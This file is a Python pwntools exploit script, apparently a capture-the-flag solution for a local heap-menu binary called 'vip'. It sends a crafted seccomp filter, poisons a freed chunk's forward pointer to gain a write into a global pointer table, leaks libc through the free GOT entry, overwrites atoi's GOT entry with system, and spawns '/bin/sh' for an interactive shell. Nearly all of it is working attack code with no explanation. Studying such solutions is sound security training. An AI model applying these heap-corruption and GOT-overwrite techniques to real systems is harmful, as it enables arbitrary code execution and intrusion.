from pwn import *
context.binary = './vip'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./vip')

def dbg():
	raw_input()

def alloc(idx):
	p.recvuntil('Your choice: ')
	p.sendline('1')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Done!\n')
	print "alloc chunk %d success!" % idx

def show(idx):
	p.recvuntil('Your choice: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	print "show %d chunk success" % idx

def delete(idx):
	p.recvuntil('Your choice: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Done!\n')
	print "delete %d chunk sucess" % idx


def edit(idx, content):
	size = len(content)
	p.sendlineafter('Your choice: ', '4')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.sendline(content)
	p.recvuntil('Done!\n')
#	print "edit %d chunk success!" % idx

def vip(name):
	p.recvuntil('Your choice: ')
	p.sendline('6')
	p.recvuntil('please tell us your name: \n')
	p.send(name)



buf_rule = 'a'*0x20
buf_rule += "\x20\x00\x00\x00\x00\x00\x00\x00"
buf_rule += "\x15\x00\x00\x03\x02\x00\x00\x00"
buf_rule += "\x20\x00\x00\x00\x10\x00\x00\x00"
buf_rule += "\x15\x00\x00\x01\x7e\x20\x40\x00"
buf_rule += "\x06\x00\x00\x00\x00\x00\x05\x00"
buf_rule += "\x06\x00\x00\x00\x00\x00\xff\x7f"

"""
#vip(buf_rule)
[alloc(i) for i in range(0, 16)]
[delete(i) for i in range(0, 15)]				#15 still exist
[alloc(i) for i in range(0, 7)]

gdb.attach(p, 'b* 0x4017F8')
dbg()
edit(15,'1'*0x400)
alloc(0)
show(0)

libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x3c4e68
system_addr = libc_base + libc.symbols['system']
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
__free_hook = libc_base + libc.symbols['__free_hook']
print "libc_base ==> " + hex(libc_base)
print "system_addr ==> " + hex(system_addr)
"""

free_got = elf.got['free']
atoi_got = elf.got['atoi']

chunk_ptr = 0x404100

vip(buf_rule)

alloc(0)
alloc(1)
alloc(2)
alloc(3)
#gdb.attach(p, 'b* 0x40176D')

delete(1)
#fake the chunk1_fd
payload = 'a'*0x50 + p64(0) + p64(0x61) + p64(chunk_ptr)
edit(0, payload)
alloc(1)

#ret is chunk_ptr
alloc(0x4)
#chunk_ptr[0], chunk_ptr[1]
edit(4, p64(free_got) + p64(atoi_got))

show(0)
free_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00'))
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']

print "system_addr ==> " + hex(system_addr)

edit(1, p64(system_addr))

p.recvuntil('Your choice: ')
p.sendline('/bin/sh\x00')

p.interactive()
p.close()